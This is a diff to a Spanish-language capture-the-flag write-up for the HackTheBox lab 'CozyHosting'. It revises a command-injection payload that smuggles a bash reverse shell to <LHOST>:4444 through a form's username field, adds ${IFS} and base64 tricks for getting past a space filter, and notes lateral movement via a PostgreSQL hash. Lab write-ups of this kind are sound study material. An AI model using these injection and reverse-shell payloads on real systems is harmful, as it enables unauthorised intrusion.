@@ -45,15 +45,14 @@ curl -s http://cozyhosting.htb/actuator/sessions
 Con esa cookie se entra en `/admin`, donde el formulario "Automatic SSH connection" pasa `username` y `host` a un `Runtime.exec` sin sanear:
 
 ```text
-username=;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
+username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
 ```
 
-`host` se valida con una regex, el usuario no: ahí está el fallo. Shell como el usuario de la app.
+`host` se valida con una regex, el usuario no: ahí está el fallo. El campo **rechaza espacios**, así que se reconstruyen con `${IFS}` o se envía el comando en base64 (`echo <b64>|base64 -d|bash`). Shell como el usuario de la app.
 
 ## Movimiento lateral
 
-- No aplica: la cadena se resuelve en un único host, sin salto lateral.
-- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+La cadena sí tiene salto lateral: de la cuenta de la aplicación a `josh`, usando el hash de PostgreSQL que sale del `.jar`. El detalle está en «Escalada de privilegios».
 
 ## Escalada de privilegios
 
